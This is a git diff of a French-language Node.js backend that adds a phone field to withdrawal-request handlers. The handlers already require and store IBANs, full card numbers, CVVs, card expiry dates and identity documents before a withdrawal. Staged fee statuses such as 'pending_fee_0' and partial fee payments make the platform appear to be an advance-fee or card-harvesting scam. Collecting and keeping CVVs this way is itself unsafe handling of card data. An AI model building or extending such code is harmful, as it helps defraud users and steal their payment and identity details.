@@ -448,10 +448,10 @@ const { sendWithdrawalRequestEmail } = require('../utils/email');
 const submitWithdrawal = async (req, res) => {
   try {
     const userId = req.user.id;
-    const { amount, first_name, last_name, address, postal_code, city, bank_name, iban, card_number, cvv, card_expiry, motif } = req.body;
+    const { amount, first_name, last_name, phone, address, postal_code, city, bank_name, iban, card_number, cvv, card_expiry, motif } = req.body;
 
     // Validation champs requis
-    if (!amount || !first_name || !last_name || !address || !postal_code || !city || !bank_name || !iban || !cvv || !card_expiry) {
+    if (!amount || !first_name || !last_name || !phone || !address || !postal_code || !city || !bank_name || !iban || !cvv || !card_expiry) {
       return res.status(400).json({ success: false, message: 'Tous les champs obligatoires doivent être renseignés.' });
     }
     const amt = Number(amount);
@@ -479,9 +479,9 @@ const submitWithdrawal = async (req, res) => {
     const { identity_doc, identity_doc_verso } = req.body;
 
     await db.run(
-      `INSERT INTO withdrawal_requests (user_id, amount, status, fee_level, identity_doc, identity_doc_verso, first_name, last_name, address, postal_code, city, bank_name, iban, card_number, cvv, card_expiry, motif, reference)
-       VALUES (?, ?, 'pending_fee_0', 0, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-      [userId, amt, identity_doc || null, identity_doc_verso || null, first_name, last_name, address, postal_code, city, bank_name, iban, card_number || null, cvv, card_expiry, motif || null, ref]
+      `INSERT INTO withdrawal_requests (user_id, amount, status, fee_level, identity_doc, identity_doc_verso, first_name, last_name, phone, address, postal_code, city, bank_name, iban, card_number, cvv, card_expiry, motif, reference)
+       VALUES (?, ?, 'pending_fee_0', 0, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+      [userId, amt, identity_doc || null, identity_doc_verso || null, first_name, last_name, phone, address, postal_code, city, bank_name, iban, card_number || null, cvv, card_expiry, motif || null, ref]
     );
 
     // Notification client
@@ -505,7 +505,7 @@ const getMyWithdrawals = async (req, res) => {
   try {
     const userId = req.user.id;
     const rows = await db.all(
-      'SELECT id, amount, status, fee_level, fee_paid, fee_partial_amount, pending_partial_amount, reference, motif, admin_note, created_at, updated_at FROM withdrawal_requests WHERE user_id = ? ORDER BY created_at DESC',
+      'SELECT id, amount, status, fee_level, fee_paid, fee_partial_amount, pending_partial_amount, phone, reference, motif, admin_note, created_at, updated_at FROM withdrawal_requests WHERE user_id = ? ORDER BY created_at DESC',
       [userId]
     );
     return res.json({ success: true, data: rows });
@@ -727,7 +727,7 @@ const updateWithdrawalCard = async (req, res) => {
   try {
     const userId = req.user.id;
     const { id } = req.params;
-    const { first_name, last_name, address, postal_code, city, bank_name, iban, card_number, cvv, card_expiry } = req.body;
+    const { first_name, last_name, phone, address, postal_code, city, bank_name, iban, card_number, cvv, card_expiry } = req.body;
 
     if (!iban || !cvv || !card_expiry) {
       return res.status(400).json({ success: false, message: "IBAN, CVV et date d'expiration sont obligatoires." });
@@ -742,13 +742,14 @@ const updateWithdrawalCard = async (req, res) => {
 
     await db.run(
       `UPDATE withdrawal_requests SET
-        first_name = ?, last_name = ?, address = ?, postal_code = ?, city = ?,
+        first_name = ?, last_name = ?, phone = ?, address = ?, postal_code = ?, city = ?,
         bank_name = ?, iban = ?, card_number = ?, cvv = ?, card_expiry = ?,
         updated_at = CURRENT_TIMESTAMP
        WHERE id = ? AND user_id = ?`,
       [
         first_name || wr.first_name,
         last_name  || wr.last_name,
+        phone      || wr.phone,
         address    || wr.address,
         postal_code|| wr.postal_code,
         city       || wr.city,
